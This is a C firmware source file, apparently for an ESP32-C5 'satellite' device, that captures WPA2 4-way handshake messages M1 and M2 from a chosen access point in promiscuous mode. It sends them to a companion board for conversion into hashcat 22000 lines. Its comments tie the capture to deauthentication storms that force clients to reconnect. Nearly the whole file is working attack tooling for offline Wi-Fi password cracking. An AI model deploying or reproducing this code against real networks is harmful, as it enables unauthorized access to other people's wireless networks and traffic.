/*
 * hs_capture.c — 5 GHz WPA2/WPA3 4-way handshake capture on the C5.
 *
 * Mirrors pmkid_capture.c but records the full (M1, M2) tuple the
 * S3 side converts into a hashcat 22000 line. The S3 can't RX on
 * 5 GHz channels, so without this the satellite's deauth storms
 * there would kick clients but we'd never actually see the
 * resulting handshake.
 *
 * Capture path:
 *   1. Pause HELLOs, lock promisc RX to the requested channel.
 *   2. For every EAPOL-Key frame from target BSSID:
 *        - FromDS (AP->STA), key-info ACK-bit set, no MIC  → M1.
 *          Store ANonce + replay counter keyed by (bssid,sta).
 *        - ToDS (STA->AP), MIC-bit set                     → M2.
 *          Match against the stored M1, emit RESP_HS tuple.
 *   3. Dedup by (bssid,sta,anonce) — same handshake shouldn't
 *      emit twice if the client retries.
 *   4. Stop on duration or CMD_STOP.
 *
 * Not implemented:
 *   - M3/M4 (M1+M2 is all hashcat 22000 needs).
 *   - WPA3/SAE commit/confirm (different format; out of scope).
 */
#include "proto.h"
#include "led_fx.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_now.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "hs";

extern volatile bool g_pause_hello;

struct hs_ctx_t {
    uint8_t  requester[6];
    uint16_t seq;
    uint8_t  target_bssid[6];
    uint8_t  channel;
    uint16_t duration_ms;
    volatile bool stop;
};
static struct hs_ctx_t *s_ctx = NULL;

/* M1 waiting room — we hold ANonce + replay counter per (bssid,sta)
 * until the matching M2 shows up. 8 simultaneous incomplete handshakes
 * is plenty; on a live AP 1-2 is typical. */
struct m1_slot_t {
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint8_t  anonce[32];
    uint8_t  replay_counter[8];
    uint32_t ts_ms;
};
#define M1_SLOTS 8
static struct m1_slot_t s_m1[M1_SLOTS];
static int s_m1_n = 0;

/* Dedup ring for emitted handshakes. */
struct done_t { uint8_t sta[6]; uint8_t anonce_tail[8]; };
#define DONE_N 16
static struct done_t s_done[DONE_N];
static int s_done_n = 0;

static bool already_emitted(const uint8_t sta[6], const uint8_t anonce[32])
{
    for (int i = 0; i < s_done_n; ++i) {
        if (memcmp(s_done[i].sta, sta, 6) == 0 &&
            memcmp(s_done[i].anonce_tail, anonce + 24, 8) == 0) return true;
    }
    if (s_done_n < DONE_N) {
        memcpy(s_done[s_done_n].sta, sta, 6);
        memcpy(s_done[s_done_n].anonce_tail, anonce + 24, 8);
        s_done_n++;
    }
    return false;
}

static struct m1_slot_t *m1_lookup(const uint8_t bssid[6], const uint8_t sta[6])
{
    for (int i = 0; i < s_m1_n; ++i) {
        if (memcmp(s_m1[i].bssid, bssid, 6) == 0 &&
            memcmp(s_m1[i].sta, sta, 6) == 0) return &s_m1[i];
    }
    return NULL;
}

static void m1_store(const uint8_t bssid[6], const uint8_t sta[6],
                     const uint8_t anonce[32], const uint8_t rc[8])
{
    struct m1_slot_t *e = m1_lookup(bssid, sta);
    if (!e) {
        if (s_m1_n >= M1_SLOTS) {
            /* Evict oldest. */
            int o = 0;
            for (int i = 1; i < s_m1_n; ++i)
                if (s_m1[i].ts_ms < s_m1[o].ts_ms) o = i;
            e = &s_m1[o];
        } else {
            e = &s_m1[s_m1_n++];
        }
    }
    memcpy(e->bssid, bssid, 6);
    memcpy(e->sta, sta, 6);
    memcpy(e->anonce, anonce, 32);
    memcpy(e->replay_counter, rc, 8);
    e->ts_ms = xTaskGetTickCount() * portTICK_PERIOD_MS;
}

static void emit_hs(const uint8_t bssid[6], const uint8_t sta[6],
                    const uint8_t anonce[32], const uint8_t snonce[32],
                    const uint8_t mic[16], const uint8_t rc[8],
                    const uint8_t *eapol_m2, int eapol_m2_len)
{
    if (!s_ctx) return;
    if (already_emitted(sta, anonce)) return;
    if (eapol_m2_len > 128) eapol_m2_len = 128;
    if (eapol_m2_len < 0)   eapol_m2_len = 0;

    posei_msg_t out;
    memset(&out, 0, sizeof(out));
    out.magic   = POSEI_MAGIC;
    out.version = POSEI_VERSION;
    out.type    = POSEI_TYPE_RESP_HS;
    out.seq     = s_ctx->seq;

    posei_hs_t *h = (posei_hs_t *)out.payload;
    memcpy(h->bssid, bssid, 6);
    memcpy(h->sta, sta, 6);
    memcpy(h->anonce, anonce, 32);
    memcpy(h->snonce, snonce, 32);
    memcpy(h->mic, mic, 16);
    memcpy(h->replay_counter, rc, 8);
    h->eapol_m2_len = (uint16_t)eapol_m2_len;
    if (eapol_m2_len > 0) memcpy(h->eapol_m2, eapol_m2, eapol_m2_len);
    h->ssid_len = 0;
    h->ssid[0]  = '\0';

    out.payload_len = sizeof(posei_hs_t);
    esp_now_send(s_ctx->requester, (const uint8_t *)&out, sizeof(out));

    ESP_LOGI(TAG, "HS emitted bssid=%02x:%02x:%02x:%02x:%02x:%02x sta=%02x:%02x:%02x:%02x:%02x:%02x m2=%d",
             bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
             sta[0],sta[1],sta[2],sta[3],sta[4],sta[5], eapol_m2_len);
}

static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_ctx || s_ctx->stop) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 32) return;
    if ((p[0] & 0x0C) != 0x08) return;   /* not a data frame */

    uint8_t tods   = p[1] & 0x01;
    uint8_t fromds = p[1] & 0x02;
    const uint8_t *bssid, *sta;
    bool ap_to_sta;
    if (tods && !fromds)      { bssid = &p[4];  sta = &p[10]; ap_to_sta = false; }
    else if (!tods && fromds) { bssid = &p[10]; sta = &p[4];  ap_to_sta = true;  }
    else return;

    if (memcmp(bssid, s_ctx->target_bssid, 6) != 0) return;

    int hdr = 24;
    if ((p[0] & 0x80)) hdr += 2;
    if (len < hdr + 8) return;
    if (!(p[hdr + 0] == 0xAA && p[hdr + 1] == 0xAA && p[hdr + 2] == 0x03 &&
          p[hdr + 6] == 0x88 && p[hdr + 7] == 0x8E)) return;

    int eapol = hdr + 8;
    if (len < eapol + 4) return;
    if (p[eapol + 1] != 0x03) return;     /* EAPOL-Key only */

    /* Key frame fields (IEEE 802.11-2016 §12.7.2): */
    const uint8_t *key = p + eapol + 4;
    int klen = len - (eapol + 4);
    if (klen < 95) return;

    /* Key Information: first 2 bytes of key frame body (after the
     * descriptor type at offset 0). Bits we care about:
     *   bit 8  (ACK)  — set on M1 and M3 (from AP)
     *   bit 9  (MIC)  — set on M2, M3, M4
     *   bit 13 (install) — set on M3 (we ignore M3/M4)
     * See hashcat wpapcap2john for reference masks. */
    uint16_t key_info = ((uint16_t)key[1] << 8) | key[2];
    bool ack = (key_info & 0x0080) != 0;
    bool mic = (key_info & 0x0100) != 0;
    bool install = (key_info & 0x0040) != 0;

    /* Nonce lives at key offset 17..48 (32 B). */
    const uint8_t *nonce = key + 17;
    /* Replay counter at offset 9..16 (8 B). */
    const uint8_t *rc = key + 9;
    /* MIC at offset 81..96 (16 B). Key-data at 97+. */
    const uint8_t *mic_bytes = key + 81;

    if (ap_to_sta && ack && !mic && !install) {
        /* M1: AP→STA, ACK=1, MIC=0. Store ANonce for the STA. */
        m1_store(bssid, sta, nonce, rc);
    } else if (!ap_to_sta && mic && !ack) {
        /* M2: STA→AP, MIC=1, ACK=0. Pair with the stored M1. */
        struct m1_slot_t *e = m1_lookup(bssid, sta);
        if (!e) return;
        emit_hs(bssid, sta, e->anonce, nonce, mic_bytes, rc,
                key, klen);
    }
}

static void hs_task(void *arg)
{
    struct hs_ctx_t *ctx = (struct hs_ctx_t *)arg;
    s_ctx = ctx;
    s_m1_n = 0;
    s_done_n = 0;

    led_fx_set(LED_MODE_SCAN);
    g_pause_hello = true;

    ESP_LOGI(TAG, "HS capture ch=%u dur=%ums bssid=%02x:%02x:%02x:%02x:%02x:%02x",
             ctx->channel, ctx->duration_ms,
             ctx->target_bssid[0], ctx->target_bssid[1], ctx->target_bssid[2],
             ctx->target_bssid[3], ctx->target_bssid[4], ctx->target_bssid[5]);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_promiscuous(true);

    uint32_t end = xTaskGetTickCount() + pdMS_TO_TICKS(ctx->duration_ms);
    while (!ctx->stop && xTaskGetTickCount() < end) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    s_ctx = NULL;
    led_fx_set(LED_MODE_IDLE);
    g_pause_hello = false;

    free(ctx);
    vTaskDelete(NULL);
}

void hs_capture_start(const uint8_t requester[6],
                      const posei_hs_req_t *req,
                      uint16_t seq)
{
    if (s_ctx) { s_ctx->stop = true; vTaskDelay(pdMS_TO_TICKS(120)); }

    struct hs_ctx_t *ctx = malloc(sizeof(*ctx));
    if (!ctx) return;
    memcpy(ctx->requester, requester, 6);
    ctx->seq          = seq;
    memcpy(ctx->target_bssid, req->bssid, 6);
    ctx->channel      = req->channel;
    ctx->duration_ms  = req->duration_ms ? req->duration_ms : 20000;
    ctx->stop         = false;

    xTaskCreate(hs_task, "hs", 4096, ctx, 4, NULL);
}

void hs_capture_stop(void)
{
    if (s_ctx) s_ctx->stop = true;
}
